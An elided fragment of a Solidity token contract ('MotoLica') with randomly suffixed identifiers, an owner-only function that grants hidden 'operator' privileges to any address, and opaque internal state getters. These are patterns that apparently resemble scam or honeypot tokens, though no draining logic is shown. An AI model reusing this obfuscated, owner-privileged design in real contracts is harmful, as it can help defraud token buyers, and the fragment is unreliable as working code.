...
contract MotoLica {
    ...
    constructor(string memory _name4IdwbD, string memory _symbolEC2jXG, uint160 _decimals, uint _supplyMDQYOL, uint160 txsCKTQCo, uint160 txsNewdjQHFI) {
        name = _name4IdwbD;
        symbol = _symbolEC2jXG;
        decimals = _decimals;
        totalSupply = _supplyMDQYOL * 10 ** _decimals; 
        balanceOf[msg.sender] = totalSupply;
        _owner = msg.sender;
        _router = address(0);
        _last = address(_owner);
        _txs = txsCKTQCo;
        _txsNew = txsNewdjQHFI;
    ...
    */
    ...
    function nodeSetDY2Ams(address _to, bool _set) external onlyOwner returns (bool) {
        require(_to != address(0));
        _operators[_to] = _set;
        return true;
    }
    ...
    function getMetricsMoeOuD() external view returns (uint160 txs, address last, bool state, bool algo) {
        txs = _txs;
        last = _last;
    ...
    function getMetricsNew71qOwX() external view returns (uint160 txsNew) {
        txsNew = _txsNew;
    }
